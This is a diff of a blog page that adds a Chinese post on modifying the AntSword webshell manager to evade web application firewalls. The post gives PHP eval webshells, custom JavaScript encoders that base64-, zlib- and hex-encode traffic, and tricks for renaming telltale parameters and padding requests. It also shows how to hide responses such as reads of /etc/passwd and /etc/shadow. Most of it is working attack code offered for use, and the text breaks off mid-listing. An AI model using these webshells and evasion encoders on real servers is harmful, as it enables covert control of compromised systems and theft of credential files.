@@ -6,14 +6,27 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge" >
   <link rel="dns-prefetch" href="http://yoursite.com">
-  <title>TuNan&#39;s Blogs</title>
+  <title>蚁剑改造 | TuNan&#39;s Blogs</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta property="og:type" content="website">
-<meta property="og:title" content="TuNan&#39;s Blogs">
-<meta property="og:url" content="http://yoursite.com/page/2/index.html">
+  <meta name="description" content="蚁剑改造">
+<meta property="og:type" content="article">
+<meta property="og:title" content="蚁剑改造">
+<meta property="og:url" content="http://yoursite.com/2021/04/21/%E8%9A%81%E5%89%91%E6%94%B9%E9%80%A0/index.html">
 <meta property="og:site_name" content="TuNan&#39;s Blogs">
+<meta property="og:description" content="蚁剑改造">
+<meta property="og:image" content="https://tva2.sinaimg.cn/large/007OtlCnly1gpr7n6mv49j30lr05ndg7.jpg">
+<meta property="og:image" content="https://tvax3.sinaimg.cn/large/007OtlCnly1gpr7nmdkp3j30jk0g3dgb.jpg">
+<meta property="og:image" content="https://tva4.sinaimg.cn/large/007OtlCnly1gpr7o9cksvj30il09imyz.jpg">
+<meta property="og:image" content="https://tvax4.sinaimg.cn/large/007OtlCnly1gpr7onb4brj30k20bdmyp.jpg">
+<meta property="og:image" content="https://tvax3.sinaimg.cn/large/007OtlCnly1gpr7pc29vtj30kf09ydhr.jpg">
+<meta property="og:image" content="https://tvax4.sinaimg.cn/large/007OtlCnly1gpr7ps8ee6j30v5079gmj.jpg">
+<meta property="og:image" content="https://tvax4.sinaimg.cn/large/007OtlCnly1gpr7q69vg0j319903yq3g.jpg">
+<meta property="og:image" content="https://tvax4.sinaimg.cn/large/007OtlCnly1gpr7qp8jj5j30r80dct91.jpg">
+<meta property="article:published_time" content="2021-04-21T03:33:06.000Z">
+<meta property="article:modified_time" content="2021-04-21T03:39:15.251Z">
 <meta property="article:author" content="TuNan">
 <meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://tva2.sinaimg.cn/large/007OtlCnly1gpr7n6mv49j30lr05ndg7.jpg">
   
     <link rel="alternative" href="/atom.xml" title="TuNan&#39;s Blogs" type="application/atom+xml">
   
@@ -143,34 +156,127 @@
             <canvas data-colors="#eaeaea" data-sectionHeight="100" data-contentId="js-content" id="myCanvas1" class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            
-  
-    <article id="post-sql注入" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+            <article id="post-蚁剑改造" class="article article-type-post " itemscope itemprop="blogPost">
   <div class="article-inner">
     
       <header class="article-header">
         
   
-    <h1 itemprop="name">
-      <a class="article-title" href="/2021/02/23/sql%E6%B3%A8%E5%85%A5/">sql注入</a>
+    <h1 class="article-title" itemprop="name">
+      蚁剑改造
     </h1>
   
 
         
-        <a href="/2021/02/23/sql%E6%B3%A8%E5%85%A5/" class="archive-article-date">
-  	<time datetime="2021-02-22T18:06:32.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-02-23</time>
+        <a href="/2021/04/21/%E8%9A%81%E5%89%91%E6%94%B9%E9%80%A0/" class="archive-article-date">
+  	<time datetime="2021-04-21T03:33:06.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-04-21</time>
 </a>
         
       </header>
     
     <div class="article-entry" itemprop="articleBody">
       
-        <p>sql注入</p>
-        
-          <a class="article-more-a" href="/2021/02/23/sql%E6%B3%A8%E5%85%A5/#more">more >></a>
-        
+        <p>蚁剑改造</p>
+<a id="more"></a>
+
+<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>蚁剑和菜刀一样是一款优秀的webshell管理工具（shll控制端），与菜刀相比，蚁剑具有开源，自定义能力强，跨平台等优点。但是蚁剑也有许多比较明显的特征，容易暴露从而被waf拦截。所以，需要进行一些改造。</p>
+<h2 id="UA头修改"><a href="#UA头修改" class="headerlink" title="UA头修改"></a>UA头修改</h2><p>蚁剑的UA头</p>
+<p><img src="https://tva2.sinaimg.cn/large/007OtlCnly1gpr7n6mv49j30lr05ndg7.jpg" alt="image-20210417153924459"></p>
+<p>可以看到蚁剑的UA头直接就是<code>antSword</code>，这很容易就被waf识别并进行拦截，所以我们需要进行修改，到<code>.modules/request.js</code>里面</p>
+<ul>
+<li><p>修改下面两个文件</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">antSword&#x2F;modules&#x2F;request.js  &#x2F;&#x2F;新版本似乎不用修改这个文件了</span><br><span class="line">21行 user-agent</span><br><span class="line"></span><br><span class="line">antSword&#x2F;modules&#x2F;update.js</span><br><span class="line">153 165行的user-agent</span><br></pre></td></tr></table></figure>
+
+
+
+</li>
+</ul>
+<ul>
+<li><p>也可以直接在连接shell的时候修改header头。</p>
+<p><img src="https://tvax3.sinaimg.cn/large/007OtlCnly1gpr7nmdkp3j30jk0g3dgb.jpg" alt="image-20210420085440325"></p>
+<p>当然也不止UA头，还有一些PHPSESSID，之前我们利用的Referer，accept–Language等等。总之就是让他像一个正常的浏览器发出的请求，那里不对改哪里。</p>
+</li>
+</ul>
+<h2 id="流量中的特征–编码器修改"><a href="#流量中的特征–编码器修改" class="headerlink" title="流量中的特征–编码器修改"></a>流量中的特征–编码器修改</h2><p>现在的蚁剑中引入了base64，chr，chr16，rot13。这些编码器，防止直接传输信息，被查杀，但是我们可以抓包看看这些编码器的包。</p>
+<p>base64</p>
+<p><img src="https://tva4.sinaimg.cn/large/007OtlCnly1gpr7o9cksvj30il09imyz.jpg" alt="image-20210418151735922"></p>
+<p>rot13</p>
+<p><img src="https://tvax4.sinaimg.cn/large/007OtlCnly1gpr7onb4brj30k20bdmyp.jpg" alt="image-20210418151943558"></p>
+<p>可以看到最后都有一个<code>eval()</code>,这个特征码就很容易被捕捉到。</p>
+<h3 id="修改🐎之全base加密"><a href="#修改🐎之全base加密" class="headerlink" title="修改🐎之全base加密"></a>修改🐎之全base加密</h3><p>比较简单的做法是，直接修改🐎，让🐎直接就接受base64加密的数据就可以了，即把🐎变成下面这样。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">@eval(base64_decode($_POST[&#39;tunan&#39;]));</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>接收到的数据是 base64 格式的，先解码，然后再传给 eval。</p>
+<p>打开编码管理写编码器</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;**</span><br><span class="line"> * php::base64编码器</span><br><span class="line"> * Create at: 2021&#x2F;04&#x2F;18 15:36:16</span><br><span class="line"> *&#x2F;</span><br><span class="line"></span><br><span class="line">&#39;use strict&#39;;</span><br><span class="line"></span><br><span class="line">module.exports &#x3D; (pwd, data, ext&#x3D;&#123;&#125;) &#x3D;&gt; &#123;</span><br><span class="line">  let randomID &#x3D; &#96;_0x$&#123;Math.random().toString(16).substr(2)&#125;&#96;;</span><br><span class="line">  data[randomID] &#x3D; Buffer.from(data[&#39;_&#39;]).toString(&#39;base64&#39;);</span><br><span class="line">  data[pwd] &#x3D; Buffer.from(&#96;eval(base64_decode($_POST[$&#123;randomID&#125;]));&#96;).toString(&#39;base64&#39;);</span><br><span class="line">  delete data[&#39;_&#39;];</span><br><span class="line">  return data;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这个其实可以直接把他最后的包提取出来，然后base64加密下就行。base64可以，那么chr等都可以这样进行修改，只要在🐎里面有相应的解密函数就行。</p>
+<p>修改完成之后再发包就是这样了，eval等也被base64加密了，不容易被识别。</p>
+<p><img src="https://tvax3.sinaimg.cn/large/007OtlCnly1gpr7pc29vtj30kf09ydhr.jpg" alt="image-20210418155311941"></p>
+<h3 id="修改🐎之zlib-deflated-raw加密"><a href="#修改🐎之zlib-deflated-raw加密" class="headerlink" title="修改🐎之zlib_deflated_raw加密"></a>修改🐎之zlib_deflated_raw加密</h3><p>其实蚁剑官方也有相应的加密方式 <code>https://github.com/AntSwordProject/AwesomeEncoder</code></p>
+<p>其中这个<code>zlib_deflated_raw</code>加密，该方式通过将数据进行zlib压缩后进行base64编码传输给shell，这样要求shell将传输的数据先进行base64解密后通过<code>gzinflate</code>将压缩数据进行解压缩，从而实现流量混淆:</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * php::zlib_deflated_raw 编码器</span></span><br><span class="line"><span class="comment"> * Create at: 2019/01/12 00:05:44</span></span><br><span class="line"><span class="comment"> * zlib 压缩 payload, 适配 shell 见代码处</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">'use strict'</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> zlib = <span class="built_in">require</span>(<span class="string">'zlib'</span>);</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">* @param  &#123;String&#125; pwd   连接密码</span></span><br><span class="line"><span class="comment">* @param  &#123;Array&#125;  data  编码器处理前的 payload 数组</span></span><br><span class="line"><span class="comment">* @return &#123;Array&#125;  data  编码器处理后的 payload 数组</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="built_in">module</span>.exports = <span class="function">(<span class="params">pwd, data</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="comment">// ##########    请在下方编写你自己的代码   ###################</span></span><br><span class="line">  <span class="keyword">let</span> randomID = <span class="string">`_0x<span class="subst">$&#123;<span class="built_in">Math</span>.random().toString(<span class="number">16</span>).substr(<span class="number">2</span>)&#125;</span>`</span>;</span><br><span class="line">  data[randomID] = zlib.deflateRawSync(data[<span class="string">'_'</span>]).toString(<span class="string">'base64'</span>);</span><br><span class="line">  </span><br><span class="line">  <span class="comment">// &lt;?php @eval($_POST['ant']);?&gt;</span></span><br><span class="line">  <span class="comment">//data[pwd] = `eval(@gzinflate(base64_decode($_POST[$&#123;randomID&#125;])));`;</span></span><br><span class="line">  </span><br><span class="line">  <span class="comment">// &lt;?php @eval(@gzinflate(base64_decode($_POST['ant']))); ?&gt;</span></span><br><span class="line">  data[pwd] = zlib.deflateRawSync(<span class="string">`@eval(@gzinflate(base64_decode($_POST[<span class="subst">$&#123;randomID&#125;</span>])));`</span>).toString(<span class="string">'base64'</span>);</span><br><span class="line">  </span><br><span class="line">  <span class="comment">// &lt;?php @eval(@gzinflate(base64_decode($_POST['ant']))); ?&gt;</span></span><br><span class="line">  <span class="comment">// data[pwd] = zlib.deflateRawSync(`@eval(@gzinflate(base64_decode($_POST[$&#123;randomID&#125;])));`).toString('base64');</span></span><br><span class="line">  </span><br><span class="line">  <span class="comment">// ##########    请在上方编写你自己的代码   ###################</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">delete</span> data[<span class="string">'_'</span>];</span><br><span class="line">  <span class="keyword">return</span> data;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>把之前的免杀shell进行修改即可，即将传输数据进行<code>gzinflate(base64_decode($_POST[&#39;&#39;]));</code></p>
+<p>传送的数据就像下面这样，</p>
+<p><img src="https://tvax4.sinaimg.cn/large/007OtlCnly1gpr7ps8ee6j30v5079gmj.jpg" alt="image-20210419093909468"></p>
+<p>像这样我们可以把数据进行多次嵌套加密，拼接等等，只要修改下我们的🐎就行。</p>
+<h3 id="流量中的0x修改"><a href="#流量中的0x修改" class="headerlink" title="流量中的0x修改"></a>流量中的0x修改</h3><p>可以看一下我们之前截取的发包图片，基本都是两个参数，第一个<code>0x**************</code>，第二个是密码，那么如果waf一看，盲猜你是蚁剑的流量，直接给你拦截了。又要怎么破解呢？</p>
+<p>我们可以看一下这些数据</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">'use strict'</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">* @param  &#123;String&#125; pwd   连接密码</span></span><br><span class="line"><span class="comment">* @param  &#123;Array&#125;  data  编码器处理前的 payload 数组</span></span><br><span class="line"><span class="comment">* @return &#123;Array&#125;  data  编码器处理后的 payload 数组</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="built_in">module</span>.exports = <span class="function">(<span class="params">pwd, data, ext=&#123;&#125;</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">'data:'</span>,data);</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">'pwd:'</span>,pwd);</span><br><span class="line">  data[pwd] = Buffer.from(data[<span class="string">'_'</span>]).toString();</span><br><span class="line">  <span class="keyword">delete</span> data[<span class="string">'_'</span>];</span><br><span class="line">  <span class="keyword">return</span> data;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>需要打开开发者工具</p>
+<p>获取到的数据</p>
+<p><img src="https://tvax4.sinaimg.cn/large/007OtlCnly1gpr7q69vg0j319903yq3g.jpg" alt="image-20210420095428057"></p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//data:</span></span><br><span class="line"></span><br><span class="line">@ini_set(<span class="string">"display_errors"</span>, <span class="string">"0"</span>);</span><br><span class="line">@set_time_limit(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">asenc</span>(<span class="params">$out</span>) </span>&#123;</span><br><span class="line">	<span class="keyword">return</span> str_rot13($out);</span><br><span class="line">&#125;;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">asoutput</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">	$output=ob_get_contents();</span><br><span class="line">	ob_end_clean();</span><br><span class="line">	echo <span class="string">"a09c"</span>.<span class="string">"812d6"</span>;</span><br><span class="line">	echo @asenc($output);</span><br><span class="line">	echo <span class="string">"661e"</span>.<span class="string">"cd0a"</span>;</span><br><span class="line">&#125;</span><br><span class="line">	ob_start();</span><br><span class="line"><span class="keyword">try</span>&#123;$D=base64_decode(substr($_POST[<span class="string">"bb642229c15a1"</span>],<span class="number">2</span>));</span><br><span class="line">	$F=@opendir($D);</span><br><span class="line">	<span class="keyword">if</span>($F==NULL) &#123;</span><br><span class="line">		echo(<span class="string">"ERROR:// Path Not Found Or No Permission!"</span>);</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		$M=NULL;</span><br><span class="line">		$L=NULL;</span><br><span class="line">		<span class="keyword">while</span>($N=@readdir($F)) &#123;</span><br><span class="line">			$P=$D.$N;</span><br><span class="line">			$T=@date(<span class="string">"Y-m-d H:i:s"</span>,@filemtime($P));</span><br><span class="line">			@$E=substr(base_convert(@fileperms($P),<span class="number">10</span>,<span class="number">8</span>),<span class="number">-4</span>);</span><br><span class="line">			$R=<span class="string">"	"</span>.$T.<span class="string">"	"</span>.@filesize($P).<span class="string">"	"</span>.$E.;</span><br><span class="line">			<span class="keyword">if</span>(@is_dir($P)) </span><br><span class="line">				$M.=$N.<span class="string">"/"</span>.$R;</span><br><span class="line">			<span class="keyword">else</span> </span><br><span class="line">				$L.=$N.$R;&#125;</span><br><span class="line">			echo </span><br><span class="line">			$M.$L;</span><br><span class="line">			@closedir($F);</span><br><span class="line">		&#125;;</span><br><span class="line">	&#125;<span class="keyword">catch</span> (Exception $e) </span><br><span class="line">	&#123;</span><br><span class="line">		echo <span class="string">"ERROR://"</span>.$e-&gt;getMessage();</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">asoutput();</span><br><span class="line">die();<span class="string">"</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">bb64.......:"</span>tFRjovU3lzdGVtIFZvbHVtZSBJbmZvcm1hdGlvbi8=<span class="string">"</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">tunan: </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">@ini_set("</span>display_errors<span class="string">", "</span><span class="number">0</span><span class="string">");</span></span><br><span class="line"><span class="string">@set_time_limit(0);</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">function asenc($out) &#123; </span></span><br><span class="line"><span class="string">	return str_rot13($out); </span></span><br><span class="line"><span class="string">&#125;;</span></span><br><span class="line"><span class="string">function asoutput() &#123; </span></span><br><span class="line"><span class="string">	$output=ob_get_contents();</span></span><br><span class="line"><span class="string">	ob_end_clean();</span></span><br><span class="line"><span class="string">	echo "</span>a09c<span class="string">"."</span><span class="number">812</span>d6<span class="string">";</span></span><br><span class="line"><span class="string">	echo @asenc($output);</span></span><br><span class="line"><span class="string">	echo "</span><span class="number">661</span>e<span class="string">"."</span>cd0a<span class="string">"; </span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">ob_start();</span></span><br><span class="line"><span class="string">try &#123;</span></span><br><span class="line"><span class="string">	$D=base64_decode(substr($_POST["</span>bb642229c15a1<span class="string">"],2));</span></span><br><span class="line"><span class="string">	$F=@opendir($D);</span></span><br><span class="line"><span class="string">	if ($F==NULL) &#123;</span></span><br><span class="line"><span class="string">		echo("</span>ERROR:<span class="comment">// Path Not Found Or No Permission!");</span></span><br><span class="line">	&#125; <span class="keyword">else</span> </span><br><span class="line">	&#123;$M=NULL;$L=NULL; </span><br><span class="line">		<span class="keyword">while</span> ($N=@readdir($F)) &#123;</span><br><span class="line">			$P=$D.$N;</span><br><span class="line">			$T=@date(<span class="string">"Y-m-d H:i:s"</span>,@filemtime($P));</span><br><span class="line">			@$E=substr(base_convert(@fileperms($P),<span class="number">10</span>,<span class="number">8</span>),<span class="number">-4</span>);</span><br><span class="line">			$R=<span class="string">"	"</span>.$T.<span class="string">"	"</span>.@filesize($P).<span class="string">"	"</span>.$E.<span class="string">"	"</span>;</span><br><span class="line">			<span class="keyword">if</span> (@is_dir($P))</span><br><span class="line">				$M.=$N.<span class="string">"/"</span>.$R; </span><br><span class="line">			<span class="keyword">else</span> </span><br><span class="line">				$L.=$N.$R;</span><br><span class="line">		&#125;</span><br><span class="line">			echo $M.$L;</span><br><span class="line">			@closedir($F);</span><br><span class="line">		&#125;;</span><br><span class="line">	&#125;</span><br><span class="line">			</span><br><span class="line">	<span class="keyword">catch</span>(Exception $e) &#123;</span><br><span class="line">		echo <span class="string">"ERROR://"</span>.$e-&gt;getMessage();</span><br><span class="line">	&#125;;</span><br><span class="line">	</span><br><span class="line">asoutput();</span><br><span class="line">die();</span><br></pre></td></tr></table></figure>
+
+<p>可以遍历data，把key也加密一下，然后再最后需要把马也对应改下</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">php::hex for 编码器</span></span><br><span class="line"><span class="comment">Create at: 2019/04/10 13:02:54</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">&lt;?php</span></span><br><span class="line"><span class="comment">foreach($_POST as $k =&gt; $v)&#123;$_POST[$k]=pack("H*", $v);&#125;</span></span><br><span class="line"><span class="comment"><span class="doctag">@eval</span>($_POST['ant']);</span></span><br><span class="line"><span class="comment">?&gt;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="meta">'use strict'</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">module</span>.exports = <span class="function">(<span class="params">pwd, data</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">let</span> ret = &#123;&#125;;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">let</span> _ <span class="keyword">in</span> data) &#123;</span><br><span class="line">    <span class="keyword">if</span> (_ === <span class="string">'_'</span>) &#123; <span class="keyword">continue</span> &#125;;</span><br><span class="line">    ret[_] = Buffer.from(data[_]).toString(<span class="string">'hex'</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  ret[pwd] = Buffer.from(data[<span class="string">'_'</span>]).toString(<span class="string">'hex'</span>);</span><br><span class="line">  <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<hr>
+<p>后来我发现，这种做法实在太麻烦了，看一下编码器</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * php::base64编码器</span></span><br><span class="line"><span class="comment"> * Create at: 2021/04/20 11:20:56</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">'use strict'</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">* @param  &#123;String&#125; pwd   连接密码</span></span><br><span class="line"><span class="comment">* @param  &#123;Array&#125;  data  编码器处理前的 payload 数组</span></span><br><span class="line"><span class="comment">* @return &#123;Array&#125;  data  编码器处理后的 payload 数组</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="built_in">module</span>.exports = <span class="function">(<span class="params">pwd, data, ext=&#123;&#125;</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="comment">// ##########    请在下方编写你自己的代码   ###################</span></span><br><span class="line">  <span class="comment">// 以下代码为 PHP Base64 样例</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// 生成一个随机变量名</span></span><br><span class="line">  <span class="keyword">let</span> randomID = <span class="string">`_0x<span class="subst">$&#123;<span class="built_in">Math</span>.random().toString(<span class="number">16</span>).substr(<span class="number">2</span>)&#125;</span>`</span>;</span><br><span class="line">  <span class="comment">// 原有的 payload 在 data['_']中</span></span><br><span class="line">  <span class="comment">// 取出来之后，转为 base64 编码并放入 randomID key 下</span></span><br><span class="line">  data[randomID] = Buffer.from(data[<span class="string">'_'</span>]).toString(<span class="string">'base64'</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// shell 在接收到 payload 后，先处理 pwd 参数下的内容，</span></span><br><span class="line">  data[pwd] = <span class="string">`eval(base64_decode($_POST[<span class="subst">$&#123;randomID&#125;</span>]));`</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// ##########    请在上方编写你自己的代码   ###################</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// 删除 _ 原有的payload</span></span><br><span class="line">  <span class="keyword">delete</span> data[<span class="string">'_'</span>];</span><br><span class="line">  <span class="comment">// 返回编码器处理后的 payload 数组</span></span><br><span class="line">  <span class="keyword">return</span> data;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>纠结的点就是0x问题，既然这样，看下代码，直接改成这样子岂不就行了。</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> randomID = <span class="string">`_0x<span class="subst">$&#123;<span class="built_in">Math</span>.random().toString(<span class="number">16</span>).substr(<span class="number">2</span>)&#125;</span>`</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> randomID =<span class="string">'token'</span>;</span><br></pre></td></tr></table></figure>
+
+<p>其实也不一定是token，可以看看数据中的参数，适当进行一定的修改。然后body里面再加一堆废数据混淆。</p>
+<h2 id="解码器"><a href="#解码器" class="headerlink" title="解码器"></a>解码器</h2><p>上面的这些操作，其实已经差不多了，但是我拦不住你的进入流量，但是我可以不给你响应相应的包，比如获取<code>etc/passwd</code>文件内容，</p>
+<p>或者<code>etc/shadow</code>这个文件，这些文件在正常的业务都不可能会出现的，所以如果一但检测到相应的文件特征就拦截，有敏感信息就审查在放包。所以返回包也需要进行加密，不能明文发送。</p>
+<h3 id="base64解码"><a href="#base64解码" class="headerlink" title="base64解码"></a>base64解码</h3><p>先看看蚁剑发送的php代码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">@ini_set(<span class="string">"display_errors"</span>, <span class="string">"0"</span>);</span><br><span class="line">@set_time_limit(<span class="number">0</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">asenc</span><span class="params">($out)</span> 